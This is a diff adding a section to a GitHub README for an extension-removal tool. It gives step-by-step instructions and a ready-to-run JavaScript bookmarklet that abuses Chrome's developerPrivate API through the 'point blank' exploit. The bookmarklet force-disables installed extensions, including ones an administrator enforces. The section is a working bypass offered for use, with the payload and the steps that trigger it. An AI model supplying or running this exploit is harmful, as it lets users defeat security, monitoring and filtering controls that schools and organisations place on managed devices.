@@ -16,6 +16,28 @@ This bookmarklet exploit that can force-disable any extension installed on Googl
 
 If you need any help, please go here: https://github.com/3kh0/ext-remover/discussions
 
+## Using point blank
+
+Using the [found by bypassi](https://blog.bypassi.com/_/point-blank/) you can disable extensions.
+
+You will need to run bookmarklets and a extension installed from the chrome web store
+
+Steps:
+
+1. Go to chrome://extensions
+2. Click any extension that's installed from the webstore, not one of the enterprise installed extensions
+3. Scroll down and click "Open in Chrome Web Store"
+4. Spam escape before the page loads. it should be a white screen, if it loads into the chrome webstore you have to try again.
+5. Run this bookmarklet:
+```js
+let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);
+```
+6. Insert extension ID into the box
+
+Note, if you close the tab the extensions will come back.
+
+Uses Bypassi's pointblank exploit, Sharp_Jack#4374 made the initial payload, posted to TN kajigs by CoolElectronics#4683
+
 ## For v106 and up
 
 ![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)
